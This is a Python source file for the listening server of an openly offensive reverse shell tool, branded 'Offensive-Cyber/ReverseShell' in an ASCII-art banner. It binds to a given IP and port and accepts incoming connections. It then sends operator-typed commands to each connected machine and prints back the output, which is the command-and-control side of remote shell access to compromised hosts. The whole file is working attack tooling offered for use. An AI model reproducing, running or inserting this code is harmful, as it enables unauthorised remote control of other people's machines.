import socket
import threading
from sys import argv

# SERVER = socket.gethostname()
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!DISCONNECT"


def usage():
    print(f"""
             _____  __  __               _                  _____       _               
    |  _  |/ _|/ _|             (_)                /  __ \     | |              
    | | | | |_| |_ ___ _ __  ___ ___   _____ ______| /  \/_   _| |__   ___ _ __ 
    | | | |  _|  _/ _ \ '_ \/ __| \ \ / / _ \______| |   | | | | '_ \ / _ \ '__|
    \ \_/ / | | ||  __/ | | \__ \ |\ V /  __/      | \__/\ |_| | |_) |  __/ |   
     \___/|_| |_| \___|_| |_|___/_| \_/ \___|       \____/\__, |_.__/ \___|_|   
                                                           __/ |                
                                                          |___/                 
    [+] github.com/Offensive-Cyber/ReverseShell

    USAGE-SERVER: python3 {argv[0]} IP PORT
""")


def handle_client(conn, addr):
    print(f"[NEW CLIENT] {addr} connected.")
    connected = True
    while connected:
        send_msg = input("#>")
        conn.send(send_msg.encode(FORMAT))
        result = conn.recv(1024).decode(FORMAT)
        print(result)


def start():
    server = socket.socket()
    SERVER = argv[1]
    PORT = int(argv[2])
    ADDR = (SERVER, PORT)
    try:
        server.bind(ADDR)
    except:
        print("[-] Can't Listen On This Address")
        exit()
    server.listen()
    print(f"[+][LISTENING] server is listening on {SERVER}")
    print()
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()
        print(f"[+][ACTIVE CONNECTIONS] {threading.activeCount() - 1}")


def main():
    if len(argv) != 3:
        usage()
    else:
        start()


if __name__ == '__main__':
    main()
